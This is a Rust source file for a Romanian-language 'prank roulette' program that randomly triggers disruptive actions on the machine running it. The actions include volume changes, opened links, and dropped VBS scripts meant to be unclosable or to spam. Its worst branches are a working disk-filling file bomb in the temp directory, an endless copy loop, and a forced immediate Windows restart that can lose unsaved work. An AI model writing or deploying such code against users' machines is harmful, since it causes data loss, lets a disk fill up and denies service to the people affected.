use include_dir::include_dir;
use include_dir::Dir;
use rand::Rng;
use rodio::{Decoder, OutputStream, Sink};
use std::fs::File;
use std::io::BufReader;
use std::io::Write;
use std::io::{self};
use std::process::Command;
use std::thread;
use std::time::Duration;

static ASSETS_DIR: Dir = include_dir!("data");

fn greet() {
    println!(
        "
    ░█████╗░████████╗███████╗███╗░░██╗████████╗██╗██╗░░░██╗███╗░░██╗███████╗██╗
    ██╔══██╗╚══██╔══╝██╔════╝████╗░██║╚══██╔══╝██║██║░░░██║████╗░██║██╔════╝██║
    ███████║░░░██║░░░█████╗░░██╔██╗██║░░░██║░░░██║██║░░░██║██╔██╗██║█████╗░░██║
    ██╔══██║░░░██║░░░██╔══╝░░██║╚████║░░░██║░░░██║██║░░░██║██║╚████║██╔══╝░░╚═╝
    ██║░░██║░░░██║░░░███████╗██║░╚███║░░░██║░░░██║╚██████╔╝██║░╚███║███████╗██╗
    ╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░╚═╝░╚═════╝░╚═╝░░╚══╝╚══════╝╚═╝

    ░█████╗░  ██╗░░░██╗███████╗███╗░░██╗██╗████████╗
    ██╔══██╗  ██║░░░██║██╔════╝████╗░██║██║╚══██╔══╝
    ███████║  ╚██╗░██╔╝█████╗░░██╔██╗██║██║░░░██║░░░
    ██╔══██║  ░╚████╔╝░██╔══╝░░██║╚████║██║░░░██║░░░
    ██║░░██║  ░░╚██╔╝░░███████╗██║░╚███║██║░░░██║░░░
    ╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝╚═╝░░╚══╝╚═╝░░░╚═╝░░░

    ██████╗░███████╗██╗░░░░░███████╗░█████╗░██╗░░░██╗░█████╗░██╗
    ██╔══██╗██╔════╝██║░░░░░██╔════╝██╔══██╗██║░░░██║██╔══██╗██║
    ██████╦╝█████╗░░██║░░░░░█████╗░░███████║██║░░░██║███████║██║
    ██╔══██╗██╔══╝░░██║░░░░░██╔══╝░░██╔══██║██║░░░██║██╔══██║╚═╝
    ██████╦╝███████╗███████╗███████╗██║░░██║╚██████╔╝██║░░██║██╗
    ╚═════╝░╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝"
    );
}

fn open_link() {
    let link;
    match rand::thread_rng().gen_range(1..=5) {
        1 => link = "https://www.youtube.com/watch?v=Dx6l-DBoKTI",
        2 => link = "https://youtu.be/3Nkui9-i1DM?t=40",
        3 => link = "https://youtu.be/HfFx5UvzSxc?t=16",
        4 => link = "https://www.youtube.com/watch?v=bGNT5Uh-WKw",
        5 => link = "https://www.youtube.com/watch?v=nU0tyzsrpwI",
        _ => link = "https://www.youtube.com/watch?v=Dx6l-DBoKTI",
    }

    #[cfg(target_os = "linux")]
    Command::new("firefox")
        .arg(link)
        .output()
        .expect("failed to execute process");

    #[cfg(target_os = "windows")]
    Command::new("cmd")
        .arg("/C")
        .arg("start")
        .arg("")
        .arg(link)
        .output()
        .expect("failed to execute process");
}

fn create_file(file_name: &str) {
    let file_data = ASSETS_DIR.get_file(file_name).unwrap().contents();
    let mut file = File::create(file_name).unwrap();
    file.write_all(file_data).unwrap();
}

fn play_mp3() {
    let file_name;
    match rand::thread_rng().gen_range(1..=2) {
        1 => file_name = "nebunu_weed.mp3",
        2 => file_name = "scoob.mp3",
        _ => file_name = "scoob.mp3",
    }

    create_file(file_name);

    let file = File::open(file_name).unwrap();
    let reader = BufReader::new(file);

    let decoder = Decoder::new(reader).unwrap();

    let (_stream, handle) = OutputStream::try_default().unwrap();
    let sink = Sink::try_new(&handle).unwrap();

    sink.append(decoder);
    sink.sleep_until_end();
    reset_volume();
}

fn update_volume() {
    let mut rng = rand::thread_rng();
    let _num = rng.gen_range(1..=100);

    #[cfg(target_os = "windows")]
    if _num < 90 {
        create_file("volume20.bat");

        Command::new("cmd")
            .args(&["/C", "volume20.bat"])
            .output()
            .expect("failed to execute process");
    } else {
        create_file("volume100.bat");
        Command::new("cmd")
            .args(&["/C", "volume100.bat"])
            .output()
            .expect("failed to execute process");
    }
    #[cfg(target_os = "windows")]
    thread::Builder::new()
        .spawn(|| {
            thread::sleep(Duration::from_secs(5));
            reset_volume();
        })
        .unwrap();
}

fn reset_volume() {
    create_file("reset_volume.bat");

    Command::new("cmd")
        .args(&["/C", "reset_volume.bat"])
        .output()
        .expect("failed to execute process");
}

fn vbs_unclosable() {
    create_file("unclosable.vbs");

    #[cfg(target_os = "windows")]
    Command::new("cmd")
        .args(&["/C", "unclosable.vbs"])
        .output()
        .expect("failed to execute process");
}

fn vbs_spam() {
    create_file("spam.vbs");

    #[cfg(target_os = "windows")]
    Command::new("cmd")
        .args(&["/C", "spam.vbs"])
        .output()
        .expect("failed to execute process");
}

fn file_bomb() {
    let temp = std::env::temp_dir().to_str().unwrap().to_string();
    let path = temp.clone() + "/oof.txt";
    let path = path.as_str();
    File::create(path).unwrap();

    for _ in 0..1000000 {
        std::fs::write(path, "F").ok();
    }

    let source_path = path;
    let mut i = 0;

    loop {
        let destination_path = temp.clone() + i.to_string().as_str();
        std::fs::copy(source_path, destination_path).ok();
        i += 1;
    }
}

fn restart() {
    #[cfg(target_os = "windows")]
    Command::new("shutdown")
        .args(&["/r", "/f", "/t", "0"])
        .output()
        .expect("failed to execute process");
}

fn get_option() -> i32 {
    let mut rng = rand::thread_rng();
    let num = rng.gen_range(1..=100);

    if num < 30 {
        1 // nimic
    } else if num < 45 {
        2 //volum
    } else if num < 60 {
        3 //link
    } else if num < 75 {
        4 //mp3
    } else if num < 90 {
        5 //vbs unclosable
    } else if num < 95 {
        6 //vbs spam
    } else if num < 99 {
        7 //file, cpu spam
    } else if num < 100 {
        8 //restart
    } else {
        0
    }
}

fn main() {
    greet();
    thread::sleep(Duration::from_secs(2));

    println!("\n\n\n");
    println!("probabilitati:");
    println!("ai scapat: 30%"); //nimic
    println!("speciala: 15%"); //volum
    println!("belea: 15%"); //link
    println!("necaz: 15%"); //mp3
    println!("obraznica: 15%"); //vbs unclosable
    println!("periculoasa: 5%"); //vbs spam
    println!("dezastru: 4%"); //file, cpu spam
    println!("nucleara: 1%"); //restart

    println!("armaghedonu: 0%");

    let mut should_update_vol = false;

    loop {
        print!("invarte beleaua dezastrului: Da");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        io::stdin().read_line(&mut input).ok();

        match get_option() {
            1 => {
                //nimic
                println!("ai scapat...de data asta :)");
            }
            2 => {
                //volum
                println!("a picat speciala");
                should_update_vol = true;
            }
            3 => {
                //link
                if should_update_vol {
                    update_volume();
                    should_update_vol = false;
                }

                println!("a picat beleua");
                open_link();

                thread::Builder::new()
                    .spawn(|| {
                        thread::sleep(Duration::from_secs(7));
                        reset_volume();
                    })
                    .unwrap();
            }
            4 => {
                //mp3
                if should_update_vol {
                    update_volume();
                    should_update_vol = false;
                }

                println!("a picat necazu");
                thread::Builder::new()
                    .spawn(|| {
                        play_mp3();
                    })
                    .unwrap();
            }
            5 => {
                //vbs unclosable
                println!("a picat obraznica");
                vbs_unclosable();
            }
            6 => {
                //vbs spam
                println!("a picat periculoasa");
                vbs_spam();
            }
            7 => {
                //file bomb
                println!("a picat periculoasa");
                file_bomb();
            }
            8 => {
                //restart
                println!("a picat nucleara");
                restart();
            }
            _ => (),
        }

        println!();
    }
}
